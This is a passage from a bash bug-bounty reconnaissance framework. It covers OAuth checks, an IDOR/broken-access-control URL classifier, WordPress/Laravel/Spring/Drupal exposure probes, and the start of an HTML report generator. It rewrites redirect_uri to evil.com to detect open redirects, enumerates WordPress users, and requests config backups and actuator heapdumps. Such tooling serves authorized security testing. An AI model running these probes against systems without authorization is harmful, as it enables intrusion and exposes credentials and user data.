    grep -iE "/(authorize|authorise|token|callback|redirect_uri|auth/code|grant|logout|end-session|revoke|introspect|userinfo|device|jwks|openid-configuration)" \
        "$MASTER" 2>/dev/null | sort -u > "$O/oauth_flow_endpoints.txt" || true

    grep -iE "[?&](client_id|client_secret|redirect_uri|response_type|grant_type|scope|state|nonce|code_challenge|code_verifier|code|id_token|access_token|refresh_token)=" \
        "$MASTER" 2>/dev/null | sort -u > "$O/oauth_params.txt" || true

    # Tokens in URLs — critical finding
    grep -iE "[?&#](access_token|id_token|token|jwt|bearer)=[a-zA-Z0-9._-]{20,}" \
        "$MASTER" 2>/dev/null | sort -u > "$O/oauth_token_in_url.txt" || true
    [[ -s "$O/oauth_token_in_url.txt" ]] && \
        log_hit "TOKENS IN URLs: $(cnt "$O/oauth_token_in_url.txt") instances!"

    # redirect_uri probe
    grep -iE "[?&]redirect_uri=" "$MASTER" 2>/dev/null \
        | sort -u > "$O/redirect_uri_params.txt" || true
    while IFS= read -r url; do
        local evil_url; evil_url=$(echo "$url" | sed 's/redirect_uri=[^&]*/redirect_uri=https:\/\/evil.com/')
        local c; c=$(_curl -o /dev/null -w "%{http_code}" "$evil_url" 2>/dev/null || echo "000")
        [[ "$c" =~ ^(200|301|302|307)$ ]] && \
            echo "OPEN_REDIRECT_URI [$c]: $evil_url" >> "$O/redirect_uri_open.txt"
    done < <(head -30 "$O/redirect_uri_params.txt" 2>/dev/null)
    [[ -s "$O/redirect_uri_open.txt" ]] && \
        log_hit "Open redirect_uri: $(cnt "$O/redirect_uri_open.txt")"

    # State param check
    grep -iE "/(authorize|auth)\?" "$MASTER" 2>/dev/null | while IFS= read -r url; do
        echo "$url" | grep -qiE "[?&]state=" || echo "MISSING_STATE: $url" >> "$O/oauth_no_state.txt"
    done || true
    [[ -s "$O/oauth_no_state.txt" ]] && \
        log_warn "OAuth without state param (CSRF risk): $(cnt "$O/oauth_no_state.txt")"

    # PKCE check
    grep -iE "/(authorize|auth)\?" "$MASTER" 2>/dev/null | while IFS= read -r url; do
        echo "$url" | grep -qiE "code_challenge" || echo "NO_PKCE: $url" >> "$O/oauth_no_pkce.txt"
    done || true
    [[ -s "$O/oauth_no_pkce.txt" ]] && \
        log_warn "OAuth without PKCE: $(cnt "$O/oauth_no_pkce.txt")"

    # JWT in JS analysis
    if [[ -s "$WORKSPACE/js/jwt_tokens.txt" ]]; then
        log_info "Analyzing JWT tokens..."
        while IFS= read -r jwt; do
            local hdr; hdr=$(echo "$jwt" | cut -d'.' -f1 | base64 -d 2>/dev/null || true)
            local alg; alg=$(echo "$hdr" | jq -r '.alg' 2>/dev/null || echo "unknown")
            [[ "$alg" == "none" || "$alg" == "NONE" ]] && {
                echo "JWT_ALG_NONE: $jwt" >> "$O/jwt_alg_none.txt"
                log_hit "JWT alg:none found!"
            }
            echo "$hdr" | grep -qi '"HS256"' && echo "JWT_HS256: $jwt" >> "$O/jwt_hs256.txt"
        done < "$WORKSPACE/js/jwt_tokens.txt"
    fi

    # Password reset endpoints
    grep -iP "/(forgot|reset|password-reset|magic-link|passwordless|otp|verify|confirm|activate)" \
        "$MASTER" 2>/dev/null | sort -u > "$O/password_reset_endpoints.txt" || true

    cat "$O"/*.txt 2>/dev/null | sort -u > "$O/OAUTH_ALL.txt"
    cat "$O/oauth_token_in_url.txt" "$O/oauth_flow_endpoints.txt" \
        "$O/oauth_no_state.txt" "$O/redirect_uri_open.txt" \
        "$O/oauth_params.txt" 2>/dev/null | sort -u > "$O/OAUTH_PRIORITY.txt"

    log_ok "OAuth — Total: $(cnt "$O/OAUTH_ALL.txt") | Priority: $(cnt "$O/OAUTH_PRIORITY.txt")"
}

# ══════════════════════════════════════════════════════
# MODULE 17 — SMART CLASSIFIER (IDOR / BAC / OAuth)
# ══════════════════════════════════════════════════════
mod_classify() {
    progress "MODULE 17 — Smart Target Classifier"
    log_section "MODULE 17 — SMART TARGET CLASSIFIER"
    local C="$WORKSPACE/classified"

    # Master input — every URL and endpoint we have
    local M="$C/master_input.txt"
    cat \
        "$WORKSPACE/urls/all_urls.txt" \
        "$WORKSPACE/urls/urls_with_params.txt" \
        "$WORKSPACE/endpoints/all_endpoints.txt" \
        "$WORKSPACE/endpoints/interesting_paths.txt" \
        "$WORKSPACE/js/all_js_endpoints.txt" \
        "$WORKSPACE/subdomains/live_urls.txt" \
        2>/dev/null | sort -u > "$M"
    local TOTAL; TOTAL=$(cnt "$M")
    log_info "Classifying $TOTAL unique targets..."

    # ── IDOR targets ──────────────────────────────────
    local IO="$C/idor"
    grep -iE "(/[a-z_-]*/[0-9]{1,12}(/|$|\?)|[?&](id|user_id|account_id|order_id|invoice_id|ticket_id|item_id|record_id|doc_id|file_id|msg_id|post_id|product_id|customer_id|member_id|profile_id|transaction_id|booking_id|patient_id|employee_id|client_id|project_id|task_id|uid|oid|pid|rid|cid|sid|uuid)=[0-9a-f-]{1,40})" \
        "$M" 2>/dev/null | sort -u > "$IO/idor_numeric_id.txt" || true

    grep -iP "[?&/][a-z_-]*/?[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" \
        "$M" 2>/dev/null | sort -u > "$IO/idor_uuid.txt" || true

    grep -iP "/api/v?[0-9]?/?(users?|accounts?|orders?|invoices?|tickets?|documents?|files?|messages?|posts?|products?|customers?|members?|profiles?|records?|transactions?|bookings?|patients?|employees?|clients?|projects?|tasks?)/[^/?\s]+" \
        "$M" 2>/dev/null | sort -u > "$IO/idor_api_object.txt" || true

    grep -iE "[?&](username|email|phone|account|owner|created_by|assigned_to|belongs_to|author|user|member|subscriber)=" \
        "$M" 2>/dev/null | sort -u > "$IO/idor_ownership_params.txt" || true

    grep -iE "/(download|view|preview|export|share|get|fetch|read|open|show|display|render)[/?][a-zA-Z0-9_-]*[=/?][a-zA-Z0-9_-]{4,}" \
        "$M" 2>/dev/null | sort -u > "$IO/idor_download_view.txt" || true

    grep -iE "[?&](token|hash|key|code|ref|share_token|download_token|view_token|nonce)=[a-zA-Z0-9+/=_-]{8,}" \
        "$M" 2>/dev/null | grep -viE "(oauth|bearer|jwt)" | sort -u > "$IO/idor_token_based.txt" || true

    cat "$IO/"*.txt 2>/dev/null | sort -u > "$IO/IDOR_ALL.txt"
    cat "$IO/idor_numeric_id.txt" "$IO/idor_api_object.txt" "$IO/idor_uuid.txt" \
        2>/dev/null | sort -u > "$IO/IDOR_PRIORITY.txt"

    local N_IDOR; N_IDOR=$(cnt "$IO/IDOR_ALL.txt")
    local N_IDOR_P; N_IDOR_P=$(cnt "$IO/IDOR_PRIORITY.txt")

    # ── BAC targets ──────────────────────────────────
    local BO="$C/bac"
    grep -iP "/(admin|administrator|superadmin|superuser|su|root|sysadmin|staff|moderator|manager|manage|management|supervisor|owner|internal|intranet|back-?office|backoffice|backstage|cms|control-?panel|cp|cpanel|dashboard|panel|console|control|hub)" \
        "$M" 2>/dev/null | sort -u > "$BO/bac_admin_paths.txt" || true

    grep -iP "/(role|roles|permission|permissions|privilege|privileges|acl|access-?control|policy|policies|grant|revoke|assign|entitlement|scope|capability)" \
        "$M" 2>/dev/null | sort -u > "$BO/bac_role_permission.txt" || true

    grep -iP "/(users?|accounts?|members?|profiles?|customers?|employees?)/(list|all|search|bulk|create|add|new|invite|delete|remove|deactivate|activate|ban|block|update|edit|reset|verify|approve|reject)" \
        "$M" 2>/dev/null | sort -u > "$BO/bac_user_management.txt" || true

    grep -iP "/(delete|remove|destroy|purge|wipe|promote|demote|escalate|elevate|impersonate|sudo|switch-?user|bulk|mass|batch|all-users|export-users|dump|backup)" \
        "$M" 2>/dev/null | sort -u > "$BO/bac_sensitive_actions.txt" || true

    grep -iP "/api/v?[0-9]?/?(users?|accounts?|customers?|members?|employees?|orders?|transactions?|invoices?|records?|logs?|events?)(\?|$)" \
        "$M" 2>/dev/null | sort -u > "$BO/bac_api_list_all.txt" || true

    grep -iP "/(settings?|configuration|config|preferences|setup|install|system|env|actuator|monitor|diagnostic|server-status|phpinfo)" \
        "$M" 2>/dev/null | sort -u > "$BO/bac_config_settings.txt" || true

    [[ -s "$WORKSPACE/vulns/idor/bac_findings.txt" ]] && \
        cp "$WORKSPACE/vulns/idor/bac_findings.txt" "$BO/bac_confirmed_unauthed.txt"

    cat "$BO/"*.txt 2>/dev/null | sort -u > "$BO/BAC_ALL.txt"
    cat "$BO/bac_admin_paths.txt" "$BO/bac_user_management.txt" \
        "$BO/bac_api_list_all.txt" "$BO/bac_confirmed_unauthed.txt" \
        2>/dev/null | sort -u > "$BO/BAC_PRIORITY.txt"

    local N_BAC; N_BAC=$(cnt "$BO/BAC_ALL.txt")
    local N_BAC_P; N_BAC_P=$(cnt "$BO/BAC_PRIORITY.txt")
    [[ -s "$BO/bac_confirmed_unauthed.txt" ]] && \
        log_hit "BAC confirmed unauthed 200: $(cnt "$BO/bac_confirmed_unauthed.txt") endpoints!"

    # ── OAuth targets ────────────────────────────────
    local OO="$C/oauth"
    [[ ! -s "$OO/OAUTH_ALL.txt" ]] && {
        grep -iE "/(oauth|oauth2|oidc|openid|connect|sso|saml|cas|authorize|token|callback)(/|\?|$)" \
            "$M" 2>/dev/null | sort -u > "$OO/OAUTH_ALL.txt" || true
        cp "$OO/OAUTH_ALL.txt" "$OO/OAUTH_PRIORITY.txt"
    }
    local N_OAUTH; N_OAUTH=$(cnt "$OO/OAUTH_ALL.txt")

    # ── Bonus categories ─────────────────────────────
    grep -iP "/(upload|uploads?|file-upload|image-upload|avatar|photo|attachment|media|import|multipart|blob)" \
        "$M" 2>/dev/null | sort -u > "$C/upload/UPLOAD_ALL.txt" || true
    grep -iP "/(export|exports?|download|report|csv|excel|pdf|dump|backup|extract|generate|snapshot|archive)" \
        "$M" 2>/dev/null | sort -u > "$C/export/EXPORT_ALL.txt" || true
    grep -iP "/(pay|payment|payments?|checkout|charge|invoice|billing|subscription|stripe|paypal|braintree|card|credit|refund|coupon|promo)" \
        "$M" 2>/dev/null | sort -u > "$C/payment/PAYMENT_ALL.txt" || true
    grep -iP "/(webhook|webhooks?|hook|notify|notification|event|callback|integration)" \
        "$M" 2>/dev/null | sort -u > "$C/webhook/WEBHOOK_ALL.txt" || true
    grep -iP "/(debug|dev|develop|test|qa|staging|phpinfo|\.env|\.git|actuator|metrics|swagger|api-docs|graphiql|playground)" \
        "$M" 2>/dev/null | sort -u > "$C/debug/DEBUG_ALL.txt" || true
    grep -iP "/(wp-admin|wp-login|joomla|drupal|typo3|magento|prestashop|phpmyadmin|adminer|cpanel|plesk|webmin|telescope|horizon)" \
        "$M" 2>/dev/null | sort -u > "$C/admin/ADMIN_CMS_ALL.txt" || true

    # ── Burp imports ─────────────────────────────────
    for key in "idor/IDOR_PRIORITY" "bac/BAC_PRIORITY" "oauth/OAUTH_PRIORITY"; do
        local fname src
        fname=$(basename "$key")
        src="$C/${key}.txt"
        [[ -s "$src" ]] && cp "$src" "$C/burp_imports/${fname}_urls.txt"
    done

    # ── Summary ──────────────────────────────────────
    echo ""
    echo -e "  ${BOLD}${MAGENTA}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "  ${BOLD}${MAGENTA}║   🎯  CLASSIFIER COMPLETE                                    ║${NC}"
    echo -e "  ${BOLD}${MAGENTA}╠══════════════════════════════════════════════════════════════╣${NC}"
    echo -e "  ${MAGENTA}║${NC}  ${RED}IDOR${NC}  Total: ${BOLD}$N_IDOR${NC}  Priority: ${RED}${BOLD}$N_IDOR_P${NC}"
    printf "  ${MAGENTA}║${NC}    ├─ Numeric IDs  : %-6s UUIDs       : %-6s\n" \
        "$(cnt "$IO/idor_numeric_id.txt")" "$(cnt "$IO/idor_uuid.txt")"
    printf "  ${MAGENTA}║${NC}    ├─ API Objects  : %-6s Download/View: %-6s\n" \
        "$(cnt "$IO/idor_api_object.txt")" "$(cnt "$IO/idor_download_view.txt")"
    printf "  ${MAGENTA}║${NC}    └─ Ownership   : %-6s Token-Based  : %-6s\n" \
        "$(cnt "$IO/idor_ownership_params.txt")" "$(cnt "$IO/idor_token_based.txt")"
    echo -e "  ${MAGENTA}║${NC}"
    echo -e "  ${MAGENTA}║${NC}  ${YELLOW}BAC${NC}   Total: ${BOLD}$N_BAC${NC}  Priority: ${YELLOW}${BOLD}$N_BAC_P${NC}"
    printf "  ${MAGENTA}║${NC}    ├─ Admin Paths  : %-6s User Mgmt    : %-6s\n" \
        "$(cnt "$BO/bac_admin_paths.txt")" "$(cnt "$BO/bac_user_management.txt")"
    printf "  ${MAGENTA}║${NC}    └─ API List-All : %-6s Role/Perms   : %-6s\n" \
        "$(cnt "$BO/bac_api_list_all.txt")" "$(cnt "$BO/bac_role_permission.txt")"
    echo -e "  ${MAGENTA}║${NC}"
    echo -e "  ${MAGENTA}║${NC}  ${CYAN}OAuth${NC} Total: ${BOLD}$N_OAUTH${NC}"
    printf "  ${MAGENTA}║${NC}  %-10s %-8s %-10s %-8s %-10s %-8s\n" \
        "Upload:" "$(cnt "$C/upload/UPLOAD_ALL.txt")" \
        "Export:" "$(cnt "$C/export/EXPORT_ALL.txt")" \
        "Payment:" "$(cnt "$C/payment/PAYMENT_ALL.txt")"
    printf "  ${MAGENTA}║${NC}  %-10s %-8s %-10s %-8s %-10s %-8s\n" \
        "Webhooks:" "$(cnt "$C/webhook/WEBHOOK_ALL.txt")" \
        "Debug/Dev:" "$(cnt "$C/debug/DEBUG_ALL.txt")" \
        "CMS/Admin:" "$(cnt "$C/admin/ADMIN_CMS_ALL.txt")"
    echo -e "  ${BOLD}${MAGENTA}╚══════════════════════════════════════════════════════════════╝${NC}"

    {
        echo "CLASSIFY_IDOR=$N_IDOR"
        echo "CLASSIFY_BAC=$N_BAC"
        echo "CLASSIFY_OAUTH=$N_OAUTH"
    } >> "$WORKSPACE/scan_config.txt"
}

# ══════════════════════════════════════════════════════
# MODULE 18 — TECH-SPECIFIC CHECKS
# ══════════════════════════════════════════════════════
mod_tech() {
    [[ "$F_QUICK" == true ]] && return
    progress "MODULE 18 — Technology-Specific Checks"
    log_section "MODULE 18 — TECHNOLOGY-SPECIFIC VULNERABILITY CHECKS"
    local TECH="$WORKSPACE/subdomains/tech_stack.txt"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
    local O="$WORKSPACE/vulns/misconfig"

    # WordPress
    if grep -qi "wordpress\|wp-" "$TECH" 2>/dev/null; then
        log_info "WordPress detected — running WP checks..."
        local WO="$O/wordpress"; mkdir -p "$WO"
        while IFS= read -r base; do
            local users; users=$(_curl "${base}/wp-json/wp/v2/users" 2>/dev/null || true)
            echo "$users" | grep -q '"id"' && {
                echo "WP_USER_ENUM: $base" >> "$WO/user_enum.txt"
                echo "$users" | jq -r '.[].name' 2>/dev/null >> "$WO/usernames.txt" || true
                log_hit "WordPress user enum: $base"
            }
            for path in "/wp-login.php" "/wp-admin/" "/xmlrpc.php" \
                        "/wp-content/debug.log" "/wp-config.php.bak" "/?author=1"; do
                local c; c=$(_curl -o /dev/null -w "%{http_code}" "${base}${path}" 2>/dev/null || echo "000")
                [[ "$c" == "200" ]] && echo "WP_EXPOSED: ${base}${path}" >> "$WO/findings.txt"
            done
        done < <(head -5 "$LIVE" 2>/dev/null)
        log_ok "WordPress: $(cnt "$O/wordpress/findings.txt") findings"
    fi

    # Laravel
    if grep -qi "laravel" "$TECH" 2>/dev/null; then
        log_info "Laravel detected — checking debug endpoints..."
        while IFS= read -r base; do
            for path in "/telescope/requests" "/_ignition/share-report" "/_debugbar" "/horizon" "/nova"; do
                local c; c=$(_curl -o /dev/null -w "%{http_code}" "${base}${path}" 2>/dev/null || echo "000")
                [[ "$c" == "200" ]] && {
                    echo "LARAVEL_EXPOSED: ${base}${path}" >> "$O/laravel_findings.txt"
                    log_hit "Laravel panel exposed: ${base}${path}"
                }
            done
        done < <(head -5 "$LIVE" 2>/dev/null)
    fi

    # Spring Boot
    if grep -qi "spring\|java\|actuator" "$TECH" 2>/dev/null; then
        log_info "Spring/Java detected — checking actuator..."
        for path in "/actuator" "/actuator/env" "/actuator/beans" \
                    "/actuator/heapdump" "/actuator/mappings" "/actuator/logfile"; do
            while IFS= read -r base; do
                local c; c=$(_curl -o /dev/null -w "%{http_code}" "${base}${path}" 2>/dev/null || echo "000")
                [[ "$c" == "200" ]] && {
                    echo "ACTUATOR_EXPOSED: ${base}${path}" >> "$O/spring_actuator.txt"
                    log_hit "Spring actuator: ${base}${path}"
                }
            done < <(head -5 "$LIVE" 2>/dev/null)
        done
    fi

    # Drupal
    if grep -qi "drupal" "$TECH" 2>/dev/null; then
        log_info "Drupal detected..."
        while IFS= read -r base; do
            for path in "/CHANGELOG.txt" "/core/CHANGELOG.txt" "/update.php" \
                        "/sites/default/settings.php"; do
                local c; c=$(_curl -o /dev/null -w "%{http_code}" "${base}${path}" 2>/dev/null || echo "000")
                [[ "$c" == "200" ]] && {
                    echo "DRUPAL_EXPOSED: ${base}${path}" >> "$O/drupal_findings.txt"
                    log_hit "Drupal exposed: ${base}${path}"
                }
            done
        done < <(head -5 "$LIVE" 2>/dev/null)
    fi

    log_ok "Tech-specific checks complete"
}

# ══════════════════════════════════════════════════════
# MODULE 19 — SCREENSHOTS
# ══════════════════════════════════════════════════════
mod_screenshots() {
    [[ "$F_QUICK" == true ]] && return
    has gowitness || {
        log_info "Installing gowitness..."
        go install github.com/sensepost/gowitness@latest 2>/dev/null \
            && log_ok "gowitness installed" \
            || { log_warn "gowitness not available — skipping screenshots"; return; }
    }
    progress "MODULE 19 — Screenshots"
    log_section "MODULE 19 — SCREENSHOTS (gowitness)"
    local O="$WORKSPACE/screenshots"
    gowitness scan file \
        -f "$WORKSPACE/subdomains/live_urls.txt" \
        --screenshot-path "$O" \
        --threads 10 \
        --timeout 15 \
        --db-path "$O/gowitness.sqlite3" \
        2>/dev/null || true
    log_ok "Screenshots → $O/"
}

# ══════════════════════════════════════════════════════
# MODULE 20 — REPORT GENERATION
# ══════════════════════════════════════════════════════
mod_report() {
    progress "MODULE 20 — Report Generation"
    log_section "MODULE 20 — REPORT GENERATION"

    local END_T; END_T=$(date +%s)
    local DUR_M=$(( (END_T - START_TIME) / 60 ))
    local DUR_S=$(( (END_T - START_TIME) % 60 ))
    local RPT="$WORKSPACE/reports"
    local DT; DT=$(date '+%Y-%m-%d %H:%M')

    # Counts
    local n_sub;     n_sub=$(cnt "$WORKSPACE/subdomains/all_subdomains.txt")
    local n_live;    n_live=$(cnt "$WORKSPACE/subdomains/live_urls.txt")
    local n_urls;    n_urls=$(cnt "$WORKSPACE/urls/all_urls.txt")
    local n_js;      n_js=$(cnt "$WORKSPACE/js/js_urls.txt")
    local n_ep;      n_ep=$(cnt "$WORKSPACE/endpoints/all_endpoints.txt")
    local n_params;  n_params=$(cnt "$WORKSPACE/params/all_params.txt")
    local n_nuc;     n_nuc=$(cnt "$WORKSPACE/vulns/nuclei/nuclei_full.txt")
    local n_crit;    n_crit; n_crit=$(grep -c "CRITICAL\|critical" "$WORKSPACE/vulns/nuclei/nuclei_full.txt" 2>/dev/null || echo 0)
    local n_high;    n_high; n_high=$(grep -c "\[HIGH\]\|\[high\]" "$WORKSPACE/vulns/nuclei/nuclei_full.txt" 2>/dev/null || echo 0)
    local n_xss;     n_xss=$(cnt "$WORKSPACE/vulns/xss/dalfox_results.txt")
    local n_lfi;     n_lfi=$(cnt "$WORKSPACE/vulns/lfi/lfi_confirmed.txt")
    local n_ssrf;    n_ssrf=$(cnt "$WORKSPACE/vulns/ssrf/ssrf_hits.txt")
    local n_csrf;    n_csrf=$(cnt "$WORKSPACE/vulns/csrf/csrf_findings.txt")
    local n_cors;    n_cors=$(cnt "$WORKSPACE/vulns/csrf/cors_misconfig.txt")
    local n_sec;     n_sec=$(cnt "$WORKSPACE/js/secrets_found.txt")
    local n_bypass;  n_bypass=$(cnt "$WORKSPACE/paths/403_bypass.txt")
    local n_bac;     n_bac=$(cnt "$WORKSPACE/vulns/idor/bac_findings.txt")
    local n_take;    n_take=$(cnt "$WORKSPACE/vulns/nuclei/nuclei_takeover.txt")
    local n_idor_p;  n_idor_p=$(cnt "$WORKSPACE/classified/idor/IDOR_PRIORITY.txt")
    local n_bac_p;   n_bac_p=$(cnt "$WORKSPACE/classified/bac/BAC_PRIORITY.txt")
    local n_oauth;   n_oauth=$(cnt "$WORKSPACE/classified/oauth/OAUTH_ALL.txt")
    local n_expose;  n_expose=$(cnt "$WORKSPACE/vulns/misconfig/sensitive_files.txt")

    # ── HTML Report ───────────────────────────────────
    cat > "$RPT/report.html" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BUG Framework v${VERSION} — ${DOMAIN}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;600;700&family=Syne:wght@700;800&family=Inter:wght@300;400;500;600&display=swap');
:root{
  --bg0:#06090f;--bg1:#0c1118;--bg2:#111925;--bg3:#192030;
  --bd:#1e3050;--bd2:#243860;
  --ac:#00d4ff;--gr:#00ff88;--re:#ff2244;--or:#ff7700;--ye:#ffcc00;--pu:#a855f7;
  --tx:#b8cce0;--t2:#7a9abf;--t3:#4a6a8f;
  --mono:'JetBrains Mono',monospace;--sans:'Inter',sans-serif;--disp:'Syne',sans-serif;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg0);color:var(--tx);font-family:var(--sans);font-size:13px;line-height:1.6}
::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:var(--bg1)}
::-webkit-scrollbar-thumb{background:var(--bd2);border-radius:3px}

.hdr{background:linear-gradient(160deg,#06090f,#0a1525 40%,#06090f);border-bottom:1px solid var(--bd2);
     padding:44px 40px 32px;text-align:center;position:relative;overflow:hidden}
.hdr::before{content:'';position:absolute;inset:0;
  background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(0,212,255,.06),transparent 70%);pointer-events:none}
.logo{font-family:var(--disp);font-size:clamp(1.5em,3.5vw,2.6em);color:var(--ac);letter-spacing:5px;
      text-shadow:0 0 40px rgba(0,212,255,.4);position:relative;display:inline-block}
.logo::after{content:'v${VERSION}';position:absolute;top:-8px;right:-50px;font-size:.3em;color:var(--gr);
  background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);padding:2px 6px;border-radius:3px;letter-spacing:2px}
.hsub{color:var(--t3);font-family:var(--mono);font-size:.78em;margin-top:5px;letter-spacing:2px}
.htgt{display:inline-flex;align-items:center;gap:8px;background:rgba(0,212,255,.07);
      border:1px solid rgba(0,212,255,.25);color:var(--ac);padding:7px 22px;border-radius:4px;
      margin-top:14px;font-family:var(--mono);font-size:1em}
.hmeta{display:flex;justify-content:center;gap:22px;margin-top:10px;font-family:var(--mono);font-size:.73em;color:var(--t3)}

.wrap{max-width:1440px;margin:0 auto;padding:22px 26px}

/* Stats */
.sg{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:9px;margin:20px 0}
.sc{background:var(--bg1);border:1px solid var(--bd);border-radius:6px;padding:14px 10px;text-align:center;
    position:relative;overflow:hidden;cursor:default;transition:transform .2s,box-shadow .2s,border-color .2s}
.sc:hover{transform:translateY(-2px);box-shadow:0 6px 22px rgba(0,0,0,.4);border-color:var(--bd2)}
.sc::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
.cb::before{background:var(--ac)}.cg::before{background:var(--gr)}.cr::before{background:var(--re)}
.cy::before{background:var(--ye)}.co::before{background:var(--or)}.cp::before{background:var(--pu)}
.sn{font-family:var(--disp);font-size:1.8em;font-weight:800;line-height:1.1}
.nc{color:var(--ac)}.ng{color:var(--gr)}.nr{color:var(--re)}.ny{color:var(--ye)}.no{color:var(--or)}.np{color:var(--pu)}
.sl{font-size:.68em;text-transform:uppercase;letter-spacing:1px;color:var(--t3);margin-top:3px}
.sc.alert{border-color:rgba(255,34,68,.4);background:rgba(255,34,68,.06)}
.sc.alert::before{background:var(--re)}.sc.alert .sn{animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.55}}

/* Sections */
.sec{background:var(--bg1);border:1px solid var(--bd);border-radius:7px;margin:14px 0;overflow:hidden}
.sh{background:var(--bg2);border-bottom:1px solid var(--bd);padding:12px 16px;
    display:flex;align-items:center;gap:9px;cursor:pointer;user-select:none}
.sh:hover{background:var(--bg3)}
.snum{width:22px;height:22px;border-radius:3px;display:flex;align-items:center;justify-content:center;
      font-family:var(--mono);font-size:.72em;font-weight:700;flex-shrink:0;background:var(--ac);color:var(--bg0)}
.snum.r{background:var(--re)}.snum.o{background:var(--or)}.snum.g{background:var(--gr);color:var(--bg0)}
.snum.y{background:var(--ye);color:var(--bg0)}.snum.p{background:var(--pu)}
.stit{font-family:var(--mono);font-size:.8em;color:var(--ac);letter-spacing:1.5px;flex:1}
.scnt{font-family:var(--mono);font-size:.72em;color:var(--t3);padding:2px 7px;background:var(--bg3);border-radius:3px}
.scnt.red{color:var(--re);background:rgba(255,34,68,.1)}
.sb{padding:16px}.sb.col{display:none}

/* Vuln items */
.vi{background:var(--bg2);border-left:3px solid;border-radius:3px;padding:9px 13px;margin:5px 0;
    font-family:var(--mono);font-size:.78em;word-break:break-all;transition:background .15s}
.vi:hover{background:var(--bg3)}
.vi.cr{border-color:var(--re);background:rgba(255,34,68,.06)}.vi.hi{border-color:var(--or);background:rgba(255,119,0,.05)}
.vi.me{border-color:var(--ye)}.vi.lo{border-color:var(--ac)}.vi.in{border-color:var(--t3)}
.bge{display:inline-block;padding:1px 7px;border-radius:3px;font-size:.69em;font-weight:700;
     text-transform:uppercase;letter-spacing:1px;margin-right:7px;font-family:var(--mono)}
.bc{background:rgba(255,34,68,.15);color:var(--re);border:1px solid rgba(255,34,68,.4)}
.bh{background:rgba(255,119,0,.15);color:var(--or);border:1px solid rgba(255,119,0,.4)}
.bm{background:rgba(255,204,0,.15);color:var(--ye);border:1px solid rgba(255,204,0,.4)}
.bl{background:rgba(0,212,255,.1);color:var(--ac);border:1px solid rgba(0,212,255,.3)}

/* Table */
.tbl{width:100%;border-collapse:collapse}
.tbl th{background:var(--bg3);color:var(--ac);font-family:var(--mono);font-size:.7em;letter-spacing:1.5px;
        padding:9px 13px;text-align:left;border-bottom:1px solid var(--bd2);white-space:nowrap}
.tbl td{padding:9px 13px;border-bottom:1px solid var(--bd);vertical-align:top;font-size:.8em}
.tbl tr:last-child td{border-bottom:none}.tbl tr:hover td{background:rgba(0,212,255,.02)}
.tt{color:var(--ye);font-weight:600;font-family:var(--mono);white-space:nowrap}
.tw{font-family:var(--mono);color:var(--t3);font-size:.82em}
.ttg{display:flex;flex-wrap:wrap;gap:4px}
.tag{background:rgba(0,255,136,.07);color:var(--gr);border:1px solid rgba(0,255,136,.2);
     padding:2px 6px;border-radius:3px;font-family:var(--mono);font-size:.7em}

/* Guide */
.gs{background:var(--bg2);border:1px solid var(--bd);border-radius:5px;padding:13px 17px;margin:9px 0}
.gs h3{color:var(--ac);font-family:var(--mono);font-size:.73em;letter-spacing:1.5px;margin-bottom:7px}
.gs p{color:var(--t2);font-size:.81em;margin-bottom:7px}
.gs code{display:block;background:rgba(0,0,0,.4);border:1px solid var(--bd2);border-left:2px solid var(--gr);
         color:var(--gr);font-family:var(--mono);font-size:.8em;padding:9px 13px;border-radius:3px;
         white-space:pre-wrap;overflow-x:auto}

/* File list */
.fl{list-style:none}
.fl li{padding:6px 0;border-bottom:1px solid var(--bd);display:flex;justify-content:space-between;
       align-items:center;font-family:var(--mono);font-size:.78em}
.fl li:last-child{border-bottom:none}
.fc{background:rgba(0,212,255,.08);color:var(--ac);padding:2px 7px;border-radius:3px;font-size:.78em;
    min-width:40px;text-align:center}
.fc.r{background:rgba(255,34,68,.1);color:var(--re)}
.fc a{color:inherit;text-decoration:none}.fc a:hover{text-decoration:underline}

/* Path grid */
.pg{display:grid;grid-template-columns:repeat(auto-fill,minmax(270px,1fr));gap:7px}
.pi{background:var(--bg2);border:1px solid var(--bd);border-radius:3px;padding:6px 10px;
    font-family:var(--mono);font-size:.73em;color:var(--gr2);word-break:break-all}

/* Alert boxes */
.alr{background:rgba(255,34,68,.07);border:1px solid rgba(255,34,68,.25);border-radius:5px;
     padding:11px 15px;margin:9px 0;color:var(--re);font-size:.8em}
.inf{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.18);border-radius:5px;
     padding:11px 15px;margin:9px 0;color:var(--t2);font-size:.8em}
.wrn{background:rgba(255,204,0,.06);border:1px solid rgba(255,204,0,.2);border-radius:5px;
     padding:11px 15px;margin:9px 0;color:var(--ye);font-size:.8em}

/* Priority labels */
.pl{display:inline-block;font-family:var(--mono);font-size:.68em;text-transform:uppercase;
    letter-spacing:1px;padding:2px 7px;border-radius:3px;margin:0 5px 8px 0}
.pi-i{background:rgba(255,34,68,.1);color:var(--re);border:1px solid rgba(255,34,68,.3)}
.pi-b{background:rgba(255,204,0,.1);color:var(--ye);border:1px solid rgba(255,204,0,.3)}
.pi-o{background:rgba(0,212,255,.1);color:var(--ac);border:1px solid rgba(0,212,255,.3)}

/* OWASP */
.owr{display:flex;flex-wrap:wrap;gap:7px;padding:7px 0}
.owb{background:var(--bg3);border:1px solid var(--bd2);border-radius:4px;padding:5px 11px;
     font-family:var(--mono);font-size:.7em;color:var(--t2)}
.owb.hit{border-color:rgba(255,34,68,.4);background:rgba(255,34,68,.07);color:var(--re)}
.owb.part{border-color:rgba(255,119,0,.4);background:rgba(255,119,0,.06);color:var(--or)}
.owb.ok{border-color:rgba(0,255,136,.2);background:rgba(0,255,136,.04);color:var(--gr)}

.sep{border:none;border-top:1px solid var(--bd);margin:14px 0}
